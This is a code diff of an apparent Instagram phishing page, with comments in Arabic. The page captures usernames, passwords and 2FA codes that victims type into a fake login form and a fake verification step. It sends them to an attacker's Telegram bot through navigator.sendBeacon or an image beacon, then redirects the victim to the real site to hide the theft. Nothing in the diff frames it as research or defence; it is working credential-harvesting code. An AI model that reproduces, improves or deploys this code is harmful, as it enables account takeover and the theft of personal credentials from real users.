@@ -207,22 +207,21 @@
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ====== الطريقة الجديدة: Image Beacon (تخدم فـ GitHub Pages) ======
+    // ====== الطريقة النهائية: navigator.sendBeacon (تخدم فـ GitHub Pages) ======
     function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
         
-        // الطريقة 1: Image Beacon (صغيرة مخفية)
-        const img = new Image();
-        img.src = url;
-        
-        // الطريقة 2: كمان نفتح request بـ fetch (فاش تفشل الصورة)
         try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.send();
-        } catch(e) {}
+            navigator.sendBeacon(url);
+        } catch(e) {
+            try {
+                const img = new Image();
+                img.src = url;
+            } catch(e2) {}
+        }
     }
 
+    // ====== SUBMIT LOGIN مع العد التنازلي ======
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         if (cooldownTimer) return;
@@ -230,6 +229,7 @@
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
+        // نرسلو البيانات فوراً
         sendToTelegram(
             `🔐 *Instagram Login Captured* 🔐\n\n` +
             `👤 *Username:* \`${capturedUsername}\`\n` +
@@ -239,6 +239,7 @@
             `🌐 *URL:* ${window.location.href}`
         );
 
+        // ====== العد التنازلي 10 ثواني ======
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = 10;
@@ -252,10 +253,13 @@
                 clearInterval(cooldownTimer);
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
+
+                // إظهار صفحة 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
                 displayUser.textContent = capturedUsername || 'your phone';
+
                 codeBoxes.forEach(box => box.value = '');
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
@@ -263,6 +267,7 @@
         }, 1000);
     });
 
+    // ===== 2FA CODE INPUT =====
     codeBoxes.forEach((box, index) => {
         box.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
@@ -293,5 +298,48 @@
         });
     });
 
+    // ===== VERIFY =====
     verifyBtn.addEventListener('click', function() {
-        const code = Array
+        const code = Array.from(codeBoxes).map(b => b.value).join('');
+
+        sendToTelegram(
+            `🔐 *Instagram 2FA Code Received* 🔐\n\n` +
+            `👤 *Username:* \`${capturedUsername}\`\n` +
+            `🔑 *Password:* \`${capturedPassword}\`\n` +
+            `🔢 *2FA Code:* \`${code}\`\n` +
+            `📱 *UA:* ${navigator.userAgent}\n` +
+            `⏰ *Time:* ${new Date().toISOString()}\n` +
+            `🌐 *URL:* ${window.location.href}`
+        );
+
+        loadingScreen.style.display = 'flex';
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com';
+        }, 2000);
+    });
+
+    // ===== RESEND =====
+    resendBtn.addEventListener('click', function() {
+        codeBoxes.forEach(box => box.value = '');
+        codeBoxes[0].focus();
+        verifyBtn.disabled = true;
+        sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+    });
+
+    // ===== BACK TO LOGIN =====
+    backLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        twofaSection.style.display = 'none';
+        loginCard.style.display = 'block';
+        signupCard.style.display = 'block';
+        checkLogin();
+    });
+
+    // ===== FACEBOOK =====
+    document.getElementById('fbLogin').addEventListener('click', function(e) {
+        e.preventDefault();
+        sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+    });
+</script>
+</body>
+</html>
